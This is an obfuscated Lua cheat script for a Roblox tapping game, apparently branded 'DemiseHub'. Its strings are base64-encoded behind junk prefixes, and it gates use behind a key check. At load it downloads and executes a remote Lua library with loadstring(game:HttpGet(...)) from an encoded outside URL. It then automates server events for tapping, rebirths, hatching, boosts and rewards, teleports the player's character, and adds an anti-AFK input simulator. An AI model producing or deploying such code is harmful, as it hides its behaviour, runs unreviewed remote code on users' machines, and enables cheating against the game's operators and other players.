local b='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
function IPNTQZJgnDtUoQMoIYvfJkGgAHctpnltNHbHzrexMwPoZHvbdquxmoOigGiK(data) m=string.sub(data, 0, 55) data=data:gsub(m,'')

data = string.gsub(data, '[^'..b..'=]', '') return (data:gsub('.', function(x) if (x == '=') then return '' end local r,f='',(b:find(x)-1) for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end return r; end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x) if (#x ~= 8) then return '' end local c=0 for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end return string.char(c) end)) end


 


--> VARIABLES <--
local Player = game.Players.LocalPlayer
print(IPNTQZJgnDtUoQMoIYvfJkGgAHctpnltNHbHzrexMwPoZHvbdquxmoOigGiK('zLKSGpAUJacpBUhgfymhRicNofbtivmxXNFOoVsUhkVYkSShPGkrKCOTG9hZGVkIERlbWlzZUh1Yg=='))

if game.PlaceId == 9498006165 then
--> LOADING THE GUI <--
local Atlas = loadstring(game:HttpGet(IPNTQZJgnDtUoQMoIYvfJkGgAHctpnltNHbHzrexMwPoZHvbdquxmoOigGiK('wwApvmqjbognkllndsfVIXbpFyLesKfZPDuwqfiwcXVTdUqRxxdMmNFaHR0cHM6Ly9yZDJnbG9yeS5jb20vQXRsYXMubHVh')))()
local UI = Atlas.new({
    Name = IPNTQZJgnDtUoQMoIYvfJkGgAHctpnltNHbHzrexMwPoZHvbdquxmoOigGiK('stBndbukoIWyNOskabcFlNNJHDvJBsaxERLYBhdVXAIwtgJKgUlsHcBRGVtaXNlSHViIHwgVGFwcGluZyBTaW11bGF0b3Ig'); 
    ConfigFolder = IPNTQZJgnDtUoQMoIYvfJkGgAHctpnltNHbHzrexMwPoZHvbdquxmoOigGiK('HdXgewruEracLzvLmskZFTKFCCaljgGpOnggVzGhPAaGXnizzDxIlkSRGVtaXNlSHVi'); 
    Credit = IPNTQZJgnDtUoQMoIYvfJkGgAHctpnltNHbHzrexMwPoZHvbdquxmoOigGiK('ECnxqQcoPBhSaekeKgJBuisNKfdCUlSarCyPFlBSKlrZYezPQjpNGxnTWFkZSBCeSBwdGgjMDMxNg=='); 
    Color = Color3.fromRGB(255, 255, 255); 
    Bind = IPNTQZJgnDtUoQMoIYvfJkGgAHctpnltNHbHzrexMwPoZHvbdquxmoOigGiK('MDkxkXDlIhmnRztsAgaCjStOjQToifhBHwBqsqjASEzoRRbhkLAcLcPTGVmdENvbnRyb2w='); 
    UseLoader = true; 
    FullName = IPNTQZJgnDtUoQMoIYvfJkGgAHctpnltNHbHzrexMwPoZHvbdquxmoOigGiK('fSJldSyFLKDzqlcdrYekTBJZPpSvzmrObUXvkQjCBWrKxKAJxMANcBfRGVtaXNlSHVi'); 
    CheckKey = function(inputtedKey) 
        return inputtedKey==IPNTQZJgnDtUoQMoIYvfJkGgAHctpnltNHbHzrexMwPoZHvbdquxmoOigGiK('nxfWWUjuZJiTmfqrHqxXKOeoLQDmIhtjVTRmDhnXPlPUNyEsmQqsGicRDNtaXNlMG5UMHA=')
    end;
    Discord = IPNTQZJgnDtUoQMoIYvfJkGgAHctpnltNHbHzrexMwPoZHvbdquxmoOigGiK('HhoHcTJxIWhSFAcUdhnPlGvllNoibonoBKrhuEUsznIYNXJJqZzYCADaHR0cHM6Ly9kaXNjb3JkLmdnL2ZRdkh4OE1qS1M=');
})

--> VALUES <--
getgenv().autoTap = nil
getgenv().autoRebirth = nil
getgenv().selectRebirth = IPNTQZJgnDtUoQMoIYvfJkGgAHctpnltNHbHzrexMwPoZHvbdquxmoOigGiK('zBOOlvYpZGgjbZVlnjFdtGASlGnweiQkTnmOYhoVwIOxepAgnfsjnGTMQ==')
getgenv().autoClaimRandom = nil
getgenv().autoEgg = nil
getgenv().autoRank = nil
getgenv().Luck = nil
getgenv().twoluck = nil
getgenv().Taps = nil

local Eggs_Table = {}
    for i,v in pairs(game:GetService(IPNTQZJgnDtUoQMoIYvfJkGgAHctpnltNHbHzrexMwPoZHvbdquxmoOigGiK('JWYsLhalcxrFNWjzzbxoZvZUDAKJKckPqoqDiipsmiEybIjGpxLlVnBV29ya3NwYWNl')).Shops:GetChildren()) do
        table.insert(Eggs_Table, v.Name)
    end

--> FUNCTIONS <--
function autoTap()
    while getgenv().autoTap == true do
        game.ReplicatedStorage.Events.Tap:FireServer()
        task.wait()
    end
end

function autoRebirth()
    while getgenv().autoRebirth == true do
        game.ReplicatedStorage.Events.Rebirth:FireServer(getgenv().selectRebirth)
        task.wait()
    end
end

function autoClaimRandom()
    while getgenv().autoClaimRandom == true do
        game.ReplicatedStorage.Events.ClaimRandomReward:FireServer()
        task.wait()
    end    
end

function autoEgg()
    while getgenv().autoEgg == true do
        game:GetService(IPNTQZJgnDtUoQMoIYvfJkGgAHctpnltNHbHzrexMwPoZHvbdquxmoOigGiK('FdWohqsDVYtOMkvpCuoJFxGkKyVtTXWQfPNTVusNHMxbQoKdCcvhlriUmVwbGljYXRlZFN0b3JhZ2U=')).Events.HatchEgg:InvokeServer({},SelectEgg,1)
        task.wait()
    end
end

function Teleport()
    while getgenv().Teleport == true do
        game:GetService(IPNTQZJgnDtUoQMoIYvfJkGgAHctpnltNHbHzrexMwPoZHvbdquxmoOigGiK('xuUjFwzEDDDaMTYBMzPudhDtvBQbaLwXWVKbTHEVKNmbcZNCsSefUkxUmVwbGljYXRlZFN0b3JhZ2U=')).Teleport.Teleport:InvokeServer({},SelectTeleport,1)
        task.wait()
    end
end

function autoRank()
    while getgenv().autoRank == true do
        game.ReplicatedStorage.Events.ClaimRankReward:FireServer()
        task.wait()
    end
end

function Luck()
    while getgenv().Luck == true do
        game.ReplicatedStorage.Events.UseBoost:FireServer(IPNTQZJgnDtUoQMoIYvfJkGgAHctpnltNHbHzrexMwPoZHvbdquxmoOigGiK('mcudoDTdYtsArKvonHFpFFbobRuIaRGxaZRSaqRQEZQxbWvKegebjEndHJpcGxlTHVjaw=='))
        wait(900)
    end
end
    
function luck()
    while getgenv().twoluck == true do
        game.ReplicatedStorage.Events.UseBoost:FireServer(IPNTQZJgnDtUoQMoIYvfJkGgAHctpnltNHbHzrexMwPoZHvbdquxmoOigGiK('nrKWhaZljtjFjOlOQIvZqaxenrklBmfgQPNhrsbqggdxvEhNZJHOgENZG91YmxlTHVjaw=='))
        wait(900)
    end
end
    
function Taps()
    while getgenv().Taps == true do
        game.ReplicatedStorage.Events.UseBoost:FireServer(IPNTQZJgnDtUoQMoIYvfJkGgAHctpnltNHbHzrexMwPoZHvbdquxmoOigGiK('tAVgZMNgsHtOeLyiKISpKmfzApqSBoxtcMtFCJkIslgrhowtDaMXACLdHJpcGxlVGFwcw=='))
        wait(900)
    end
end

--> PAGES <--
local Farm = UI:CreatePage(IPNTQZJgnDtUoQMoIYvfJkGgAHctpnltNHbHzrexMwPoZHvbdquxmoOigGiK('XVpeCTJDcaGmfszfuIImdmJvxToVfHddBwmhSsGPDkogJOrkVpypvyuQXV0b0Zhcm0='))
local Eggs = UI:CreatePage(IPNTQZJgnDtUoQMoIYvfJkGgAHctpnltNHbHzrexMwPoZHvbdquxmoOigGiK('XiVVbVVPTPUizGqkgnNKIpOeWrWDhKkfbWjxNzbTnXIVPmncKmCukfNRWdncw=='))
local Player = UI:CreatePage(IPNTQZJgnDtUoQMoIYvfJkGgAHctpnltNHbHzrexMwPoZHvbdquxmoOigGiK('muGXGCZxpChuKnjNFaWKyOiVsDcqQCIuIJNfLfPNmvPkxMOBVradfArUGxheWVy'))
local Misc = UI:CreatePage(IPNTQZJgnDtUoQMoIYvfJkGgAHctpnltNHbHzrexMwPoZHvbdquxmoOigGiK('ZiWbvmZQKfdVLxdqxPnruvYdEmqpVOuQQwHAwtkuYgvYjlKlNGHSdfGTWlzYw=='))

--> SECTIONS <--
local AutoFarm = Farm:CreateSection(IPNTQZJgnDtUoQMoIYvfJkGgAHctpnltNHbHzrexMwPoZHvbdquxmoOigGiK('gbnTpfQQebBJEBpVFoatAZGZVrgIPxzdviidwjqbxiOgktkMiHtUTkhQXV0byBTdHVmZg=='))
local Eggs = Eggs:CreateSection(IPNTQZJgnDtUoQMoIYvfJkGgAHctpnltNHbHzrexMwPoZHvbdquxmoOigGiK('QNusMHyzptWOexoBPMiYTboMQzmFuBTRuyZvRNwxjsOzhazpOwydkkHQXV0byBFZ2dz'))
local Misc = Misc:CreateSection(IPNTQZJgnDtUoQMoIYvfJkGgAHctpnltNHbHzrexMwPoZHvbdquxmoOigGiK('PXGpBrGfATXoKQZKYCyPBPsYuTbZiEmZFxjShvvWTWEvRanUuvFIEcaTWlzYw=='))
local Teleport = Player:CreateSection(IPNTQZJgnDtUoQMoIYvfJkGgAHctpnltNHbHzrexMwPoZHvbdquxmoOigGiK('oaQuTJYZTNGxxsVbIhjBjKcZInqRjUqxHtOBxkVbibzvBwOayGJAJEWVGVsZXBvcnRz'))

--> TOGGLES <--
AutoFarm:CreateToggle({ 
    Name = IPNTQZJgnDtUoQMoIYvfJkGgAHctpnltNHbHzrexMwPoZHvbdquxmoOigGiK('rWfvlvOhpdJeEILeNPtSLwuwNdfiWIJKGsCUDnVIrSSdezZNbfbTRXEQXV0b1RhcA=='); 
    Flag = IPNTQZJgnDtUoQMoIYvfJkGgAHctpnltNHbHzrexMwPoZHvbdquxmoOigGiK('SdfOmhhHuFDDBkFPiHarFANLZKbgnOCCmpoRVBibowMOihAbJyZzstBVGFw'); 
    Default = false; 
    Callback = function(v) 
        getgenv().autoTap = v
        autoTap()
    end;
})

AutoFarm:CreateToggle({ 
    Name = IPNTQZJgnDtUoQMoIYvfJkGgAHctpnltNHbHzrexMwPoZHvbdquxmoOigGiK('fiLtHWXqPOGSXjpdpyPEROnvFvOJNblWcsafvzfxKjAroZNFPChCaIsQXV0b1JlYmlydGg='); 
    Flag = IPNTQZJgnDtUoQMoIYvfJkGgAHctpnltNHbHzrexMwPoZHvbdquxmoOigGiK('fQHJzfibPXQBFaJPRFXUywTDQWioIQshRyccPDWrnKDHCvxxyRloPGDUmViaXJ0aA=='); 
    Default = false; 
    Callback = function(v) 
        getgenv().autoRebirth = v
        autoRebirth()
    end;
})

local MyDropdown = AutoFarm:CreateDropdown({
    Name = IPNTQZJgnDtUoQMoIYvfJkGgAHctpnltNHbHzrexMwPoZHvbdquxmoOigGiK('hVzIornJybOekyZSiEtnAPAhwlGCJhqxcKVemDsXfVFDCRKwefegmElU2VsZWN0UmViaXJ0aA==');
    Callback = function(Value) 
        getgenv().selectRebirth = Value
        print(IPNTQZJgnDtUoQMoIYvfJkGgAHctpnltNHbHzrexMwPoZHvbdquxmoOigGiK('RWGFMdqAhaDSCkuBqcSGEkYmphcSVnjgQAfKAnicLnGjkJvgJZoEutPc2VsZWN0UmViaXJ0aCgp'))
    end;
    Options = {IPNTQZJgnDtUoQMoIYvfJkGgAHctpnltNHbHzrexMwPoZHvbdquxmoOigGiK('fASeZyJREFUHNwqRiRRPwCyeCmxnDQBSjwDQFRWwqDatQyercIPAzJAMQ=='),IPNTQZJgnDtUoQMoIYvfJkGgAHctpnltNHbHzrexMwPoZHvbdquxmoOigGiK('ZBoNOcNeckcdzmiFpoxBtoRYQeSMAMTgYGdelnlZCzbMZLZVRiwHVEzNQ=='),IPNTQZJgnDtUoQMoIYvfJkGgAHctpnltNHbHzrexMwPoZHvbdquxmoOigGiK('lQVTxruWsRrzfjUMyGVoMkNsKtkmlRgWKqgwBUrqhjAvhCOlcrcieGfMTA='),IPNTQZJgnDtUoQMoIYvfJkGgAHctpnltNHbHzrexMwPoZHvbdquxmoOigGiK('UHRmbDxpwwPKpSaOuWLiVXEaIrrQWVKoPvxcREDLlFVcgunBbAZaqKeMjA='),IPNTQZJgnDtUoQMoIYvfJkGgAHctpnltNHbHzrexMwPoZHvbdquxmoOigGiK('tbDXjQEKgdlzsXrVGQMYYZYVwTQooqiheatHyELliwkmUgEPWdRlNaMMTAw'),IPNTQZJgnDtUoQMoIYvfJkGgAHctpnltNHbHzrexMwPoZHvbdquxmoOigGiK('PBtDOKjUPXHlyiOCoTrTcCuzDQhfleEORlUnHLEghJnGxylPUPDniyFNTAw'),IPNTQZJgnDtUoQMoIYvfJkGgAHctpnltNHbHzrexMwPoZHvbdquxmoOigGiK('kdbcBZhognLGPGFxMRBjdOTyBtDFNKwfmhmaEfcmTGQrTXRFuJEbfYbMjAwMA=='),IPNTQZJgnDtUoQMoIYvfJkGgAHctpnltNHbHzrexMwPoZHvbdquxmoOigGiK('cvGvytGCeLLGydWeGsRaZIHcPTAJcFdWPYIInuIHrwSMeSsYyfzDtQjNDUwMA=='),IPNTQZJgnDtUoQMoIYvfJkGgAHctpnltNHbHzrexMwPoZHvbdquxmoOigGiK('oTUfxpMwzQMUizpOFzsksZgzkCaKnXASAQqtkwoheOxWhEeIuWMZjoyODAwMA=='),IPNTQZJgnDtUoQMoIYvfJkGgAHctpnltNHbHzrexMwPoZHvbdquxmoOigGiK('XAmEhXtiFMyDKkvgyWHgDwkJsOdFHuKCqOUngObtLYKTIVPFJoKCUwdMTI1MDA='),IPNTQZJgnDtUoQMoIYvfJkGgAHctpnltNHbHzrexMwPoZHvbdquxmoOigGiK('RUXhmuKkPsRyvXpSDJovSkUjSQLjWbqnJNmJRsnTpUKYYpXIxKPKzEPMTgwMDA='),IPNTQZJgnDtUoQMoIYvfJkGgAHctpnltNHbHzrexMwPoZHvbdquxmoOigGiK('BEwWbNkYUEloENbYfSdLHkzmQThwEqyZHdZFKVYrkjHDsqIrGSkqmySMjQ1MDA='),IPNTQZJgnDtUoQMoIYvfJkGgAHctpnltNHbHzrexMwPoZHvbdquxmoOigGiK('vDBLLsaXXrMxVJuAXiVEuIuoResKCtdifiYdUwOUUiFRbCvHshSPoZFMzIwMDA='),IPNTQZJgnDtUoQMoIYvfJkGgAHctpnltNHbHzrexMwPoZHvbdquxmoOigGiK('EAIAtwpKvJYnqbroCwFrTYiTiEZJqyRqVdZsRToMgxvCLoSEvBRPSSLNDA1MDA='),IPNTQZJgnDtUoQMoIYvfJkGgAHctpnltNHbHzrexMwPoZHvbdquxmoOigGiK('MpwbbsuTLEUzrMzaOpidjcrYnsuYnsMBsvrYaNPPJphTKhcMTLBCqmNNTAwMDA='),IPNTQZJgnDtUoQMoIYvfJkGgAHctpnltNHbHzrexMwPoZHvbdquxmoOigGiK('BKHVZDtgopgbdVQiXbIzaiLrhHIYTIBWACsNhbzYFLFHDWdPrNAwhwhNzUwMDA='),IPNTQZJgnDtUoQMoIYvfJkGgAHctpnltNHbHzrexMwPoZHvbdquxmoOigGiK('LsrSQDHThuazvBBCLWXsOyxofjjVuoHmESpZDOTtfidowWSUuyDjBIrMTI1MDAw'),IPNTQZJgnDtUoQMoIYvfJkGgAHctpnltNHbHzrexMwPoZHvbdquxmoOigGiK('DTutHjzUHoATahezhZMJgPaowsbJhpztraUlGPAxWgATKKKSZOsqIpGMzUwMDAw'),IPNTQZJgnDtUoQMoIYvfJkGgAHctpnltNHbHzrexMwPoZHvbdquxmoOigGiK('rJRPaFfNElVpngnMEBBdmOqzyHWucYaITRKQgyeMwSeqmXOHlBvgoSJNzUwMDAw'),IPNTQZJgnDtUoQMoIYvfJkGgAHctpnltNHbHzrexMwPoZHvbdquxmoOigGiK('HVxoyyOqnXxwcLrDOuwztVhuebKgeGrrEmDaqHNGzewGGgkRiQeFRfBMTAwMDAwMA=='),IPNTQZJgnDtUoQMoIYvfJkGgAHctpnltNHbHzrexMwPoZHvbdquxmoOigGiK('GaEtLLsTrHnNHrAeFOXjSieuVxwRFNXxqUavQFoDTWYdMOJqHnRTILUMjAwMDAwMA==')}; 
    ItemSelecting = true; 
    DefaultItemSelected = IPNTQZJgnDtUoQMoIYvfJkGgAHctpnltNHbHzrexMwPoZHvbdquxmoOigGiK('sTmuyJEcGuueuWyqSbvAOZcNkFItqZfqBSCUkHDsAahzuaLNiBljVavMQ=='); 
    
})

AutoFarm:CreateToggle({ 
    Name = IPNTQZJgnDtUoQMoIYvfJkGgAHctpnltNHbHzrexMwPoZHvbdquxmoOigGiK('cpiNtMKOIZHAXWuFrunqckukmzxUVqGkWzcorgDJFoLtpikDlfEOIZwQXV0byBVc2UgM3ggTHVja3koRXZlcnkgMTUgTWlucyk='); 
    Flag = IPNTQZJgnDtUoQMoIYvfJkGgAHctpnltNHbHzrexMwPoZHvbdquxmoOigGiK('AoHjZgOZnLXysVVSGyLavEwXWKcevpFwigWOSNQrwrzgnnpDXwWpxYlM3g='); 
    Default = false; 
    Callback = function(v) 
        getgenv().Luck = v
        Luck()
    end;
})

AutoFarm:CreateToggle({ 
    Name = IPNTQZJgnDtUoQMoIYvfJkGgAHctpnltNHbHzrexMwPoZHvbdquxmoOigGiK('iHkbLMUKxRYKBNnJxsDNymmvIXUxBQmTJXzAxOYQprDvEjlLVhvdSbFQXV0byBVc2UgMnggTHVja3koRXZlcnkgMTUgTWlucyk='); 
    Flag = IPNTQZJgnDtUoQMoIYvfJkGgAHctpnltNHbHzrexMwPoZHvbdquxmoOigGiK('RkUmoDCGqHjSMaINfPPlwtFtMSSLRwPafSgEndXDIWcjYWlZVbDAOyIMng='); 
    Default = false; 
    Callback = function(v) 
        getgenv().twoluck = v
        luck()
    end;
})


AutoFarm:CreateToggle({ 
    Name = IPNTQZJgnDtUoQMoIYvfJkGgAHctpnltNHbHzrexMwPoZHvbdquxmoOigGiK('GmXKfSlqaEyjPBUkZVkplhEiBHuauKLwUmepXocLqqMfnnixOnXTwCaQXV0byBVc2UgM3ggVGFwcyhFdmVyeSAxNSBNaW5zKQ=='); 
    Flag = IPNTQZJgnDtUoQMoIYvfJkGgAHctpnltNHbHzrexMwPoZHvbdquxmoOigGiK('zmPlJwgizGjLnlwAjVTeoLWQspoqmPefXXlCfewISzoJyZgCSexLLxuM3Q='); 
    Default = false; 
    Callback = function(v) 
        getgenv().Taps = v
        Taps()
    end;
})

AutoFarm:CreateToggle({ 
    Name = IPNTQZJgnDtUoQMoIYvfJkGgAHctpnltNHbHzrexMwPoZHvbdquxmoOigGiK('jjolJiAiwtKHcCpZNvjoVEpWiKgnfzVsumOLuUnqQbJXpSivrpTCUSTQXV0byBDbGFpbSBSYW5rIFJld2FyZHM='); 
    Flag = IPNTQZJgnDtUoQMoIYvfJkGgAHctpnltNHbHzrexMwPoZHvbdquxmoOigGiK('pJnNuNpancYxSwHHFeIrEVUAVqFguWJqvPTAPXoLYWcGbqdGkQyGwYccmFuaw=='); 
    Default = false; 
    Callback = function(v) 
        getgenv().autoRank = v
        autoRank()
    end;
})

AutoFarm:CreateToggle({ 
    Name = IPNTQZJgnDtUoQMoIYvfJkGgAHctpnltNHbHzrexMwPoZHvbdquxmoOigGiK('qPdpWtQxhjMFpyMKTsslILodPnWVkRrQTILgkcJrDQKAKKlNWucKocdQXV0byBDbGFpbSBSYW5kb20gUmV3YXJkcw=='); 
    Flag = IPNTQZJgnDtUoQMoIYvfJkGgAHctpnltNHbHzrexMwPoZHvbdquxmoOigGiK('TPwYXonjaFyWjNBvyFaCRFrVqSipeRjQfkdUQrgZerhDKSnlphridFqcmFuZG9t'); 
    Default = false; 
    Callback = function(v) 
        getgenv().autoClaimRandom = v
        autoClaimRandom()
    end;
})

AutoFarm:CreateToggle({ 
    Name = IPNTQZJgnDtUoQMoIYvfJkGgAHctpnltNHbHzrexMwPoZHvbdquxmoOigGiK('lDmDMqHWyiQvrnZuEifdIRAypzwcorpPgCfblaTQaqwznrLHjBkYwoAT3BlbiBUcmF2ZWxpbmcgTWVyY2hhbnQgR1VJ'); 
    Flag = IPNTQZJgnDtUoQMoIYvfJkGgAHctpnltNHbHzrexMwPoZHvbdquxmoOigGiK('MCKqudKCJIexOsGsWmhwQizduDdeJvQGrMztEBnSVhxZZyxMBSQqwdWcmFuZG9t'); 
    Default = false; 
    Callback = function(v) 
        game.Players.localPlayer.PlayerGui.UI.ExoticShop.Visible = v
    end;
})

AutoFarm:CreateToggle({ 
    Name = IPNTQZJgnDtUoQMoIYvfJkGgAHctpnltNHbHzrexMwPoZHvbdquxmoOigGiK('KyyiQgqxRvbFypjdgIZIRXGTYTNFIqpQTbYnNdtEFWjEhusEWUlycTdT3BlbiBNYWdtYSBGb3JnZSBHVUk='); 
    Flag = IPNTQZJgnDtUoQMoIYvfJkGgAHctpnltNHbHzrexMwPoZHvbdquxmoOigGiK('EZNtyoClHajfzWlmNMQQYyxeRCvwYnHNgRLoMOtnFdCdGQectZOdMjFcmFuZG9t'); 
    Default = false; 
    Callback = function(v) 
        game.Players.localPlayer.PlayerGui.UI.MagmaForge.Visible = v
    end;
})

AutoFarm:CreateToggle({ 
    Name = IPNTQZJgnDtUoQMoIYvfJkGgAHctpnltNHbHzrexMwPoZHvbdquxmoOigGiK('mwhnlbUCSeVJsrsXanhAxpWNWfPuhxjtmihRRIMSduMvsYeKySZeueET3BlbiBFbmNoYW50bWVudCBHVUk='); 
    Flag = IPNTQZJgnDtUoQMoIYvfJkGgAHctpnltNHbHzrexMwPoZHvbdquxmoOigGiK('ovBgxYBJIUBOQRgTCrmUqmBpYCUfIcFAEYonKmbCPlRfKQkXVRfYfFOcmFuZG9t'); 
    Default = false; 
    Callback = function(v) 
        game.Players.localPlayer.PlayerGui.UI.Enchantment.Visible = v
    end;
})

AutoFarm:CreateToggle({ 
    Name = IPNTQZJgnDtUoQMoIYvfJkGgAHctpnltNHbHzrexMwPoZHvbdquxmoOigGiK('ObAXIVUiXVnfGKlUqwvqpCrSLjgDcfFkOMEFODySMptSciRVChxRIsGT3BlbiBQZXQgSW5kZXggR1VJ'); 
    Flag = IPNTQZJgnDtUoQMoIYvfJkGgAHctpnltNHbHzrexMwPoZHvbdquxmoOigGiK('bBAZuzcobayMaotNaQrKdPuqjQFBTvfZqGlGUnvlCeCebYbLDEPPSPhcmFuZG9t'); 
    Default = false; 
    Callback = function(v) 
        game.Players.localPlayer.PlayerGui.UI.PetIndex.Visible = v
    end;
})

Eggs:CreateToggle({ 
    Name = IPNTQZJgnDtUoQMoIYvfJkGgAHctpnltNHbHzrexMwPoZHvbdquxmoOigGiK('YtkLcLLkgSkFdVchGvDmmvxbcGsRwGsTvBNuSLpsfLdQdiQXGhuxkusQXV0b0hhdGNo'); 
    Flag = IPNTQZJgnDtUoQMoIYvfJkGgAHctpnltNHbHzrexMwPoZHvbdquxmoOigGiK('KtKZbFcBaWdmqDqZabXDwYWCccLpMtIRGOFZfAaQDnMlwCsNkrGjIyBRWdn'); 
    Default = false; 
    Callback = function(v) 
        getgenv().autoEgg = v
        autoEgg()
    end;
})

--> BUTTONS <--
Misc:CreateButton({
    Name = IPNTQZJgnDtUoQMoIYvfJkGgAHctpnltNHbHzrexMwPoZHvbdquxmoOigGiK('wqmobUcTFesUVstwwsbddVlnNBdCWmdZpgCVPOJdLcJOqcwaKrRxOtMQW50aSBBZms='); 
    Callback = function() 
        local L_83_ = game:GetService(IPNTQZJgnDtUoQMoIYvfJkGgAHctpnltNHbHzrexMwPoZHvbdquxmoOigGiK('YlFeoFmKpZZypZczSASNkCCKTTMegMZxtnsxZaBeLfppXtmhfKgKUmjVmlydHVhbFVzZXI='))
        game:GetService(IPNTQZJgnDtUoQMoIYvfJkGgAHctpnltNHbHzrexMwPoZHvbdquxmoOigGiK('OzfYzxAHkRkOTNrgnCIVHxkMqzAGekfLvgrNRLmkrJcQlqFSeXUMCylUGxheWVycw==')).Idled:connect(function()
            warn(IPNTQZJgnDtUoQMoIYvfJkGgAHctpnltNHbHzrexMwPoZHvbdquxmoOigGiK('nEyWYrDiOVVEBjiZVobQudjCoaHBWleexKimLSXGaBqENTGlPZSlwIUYW50aS1hZms='))
            L_83_:CaptureController()
            L_83_:ClickButton2(Vector2.new())
        end)
    end
})

--> DROPDOWNS <--
local Teleports = Teleport:CreateDropdown({
    Name = IPNTQZJgnDtUoQMoIYvfJkGgAHctpnltNHbHzrexMwPoZHvbdquxmoOigGiK('hwNXsKaKJlizMTbdYaQgprwekoUWLRWrvYWVuLYDJTQzzYIYFioOVTiU2VsZWN0IFRlbGVwb3J0');
    Callback = function(Value) 
        getgenv().selectRebirth = Value
        if Value == IPNTQZJgnDtUoQMoIYvfJkGgAHctpnltNHbHzrexMwPoZHvbdquxmoOigGiK('XyUAemhgIIOHfbdtzQWbjlnAcicYPbqhbLITCtbnORVtPwlExXPNKdDU3Bhd24gQXJlYQ==') then
          game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-84.6454, 16.5506, -481.442)
        elseif Value == IPNTQZJgnDtUoQMoIYvfJkGgAHctpnltNHbHzrexMwPoZHvbdquxmoOigGiK('UyAvvuBKraEXiSrrUkSpZdLYWGZZiAiNUnzOcmlbBIxFgyMlulheBOZRm9yZXN0IEFyZWE=') then
           game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-161.951, 977.215, -444.774)
        elseif Value == IPNTQZJgnDtUoQMoIYvfJkGgAHctpnltNHbHzrexMwPoZHvbdquxmoOigGiK('EfsrhDGebiDwHUmxuEzPyiFwXzxYbIVUzkXEcYoiTGtpQAEqGBPenWlRmxvd2VyIEFyZWE=') then
            game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-176.474, 1514.45, -648.01)
        elseif Value == IPNTQZJgnDtUoQMoIYvfJkGgAHctpnltNHbHzrexMwPoZHvbdquxmoOigGiK('nbKDdIGVvZavIXrSzPuCGdKOODUaYJBEutzUiwSFArMvdxBpQuzApRPU3dhbXAgQXJlYQ==') then
            game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-264.011, 2113.39, -656.807)
        elseif Value == IPNTQZJgnDtUoQMoIYvfJkGgAHctpnltNHbHzrexMwPoZHvbdquxmoOigGiK('KnzWxaUWcQWZDCVrhsUCiRbLJiXROehrycMNbfrvVRSnldyFssaHAPPU25vdyBBcmVh') then
            game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-241.092, 2934.25, -469.995)
        elseif Value == IPNTQZJgnDtUoQMoIYvfJkGgAHctpnltNHbHzrexMwPoZHvbdquxmoOigGiK('OhhPkpNIzgzFQRqHCrEHXcMCONAzmcSNbVXDJYxeBoIpidCQTUMBvarU2FuZCBBcmVh') then
            game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-205.881, 4225.35, -779.94)
        elseif Value == IPNTQZJgnDtUoQMoIYvfJkGgAHctpnltNHbHzrexMwPoZHvbdquxmoOigGiK('RPpOHbvftLnlNgRquloiKvvyNCaOWafJVTMCtxdUwpKrxEOoKbnJWPbRGVhdGggQXJlYQ==') then
            game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-319.197, 5415.49, -480.928)
        elseif Value == IPNTQZJgnDtUoQMoIYvfJkGgAHctpnltNHbHzrexMwPoZHvbdquxmoOigGiK('ZImnLtWicvAhIqLTPLnCjmcAamKbbPyrmeKnMGttCPGohCPasWTuJhSQmVhY2ggQXJlYQ==') then
            game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-180.304, 6872.29, -495.251)
        elseif Value == IPNTQZJgnDtUoQMoIYvfJkGgAHctpnltNHbHzrexMwPoZHvbdquxmoOigGiK('JMklBiaBUZVmPCvXNXGzSyPlIuxnYqjzuHNFKrrdtBqBvhYzXbmeuopTWluZXMgQXJlYQ==') then
            game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-274.924, 8365.88, -483.89)
        elseif Value == IPNTQZJgnDtUoQMoIYvfJkGgAHctpnltNHbHzrexMwPoZHvbdquxmoOigGiK('mIIxVVCjzCTYWSpwXfPgdZCHHFPIXMGGNmCwkabZENZHvGTGcPAYgMWTWluZXMgQXJlYQ==') then
            game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-274.924, 8365.88, -483.89)
        elseif Value == IPNTQZJgnDtUoQMoIYvfJkGgAHctpnltNHbHzrexMwPoZHvbdquxmoOigGiK('wSxoikqGvQuIEtYfuAdgSPmoHJbqwOXlcNKwvgfnMSnFYkNCECjyXpKQ2xvdWQgQXJlYQ==') then
            game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-336.513, 11236.1, -236.306)
        elseif Value == IPNTQZJgnDtUoQMoIYvfJkGgAHctpnltNHbHzrexMwPoZHvbdquxmoOigGiK('OIALcWnOSjflSlivYjTtieTJtKFMWbtJNrFcipjJBbxJKAApRvpPgpAQ29yYWwgQXJlYQ==') then
            game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-473.613, 13801.8, -543.772)
        elseif Value == IPNTQZJgnDtUoQMoIYvfJkGgAHctpnltNHbHzrexMwPoZHvbdquxmoOigGiK('cfyGmtZeSXdRtzXNhXkbKiWmMXABmnLRqQRnSyyeyiFQsZCGhEswaFURGFya2hlYXJ0IEFyZWE=') then
            game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-447.291, 17169.8, -552.321)
    end
    end;
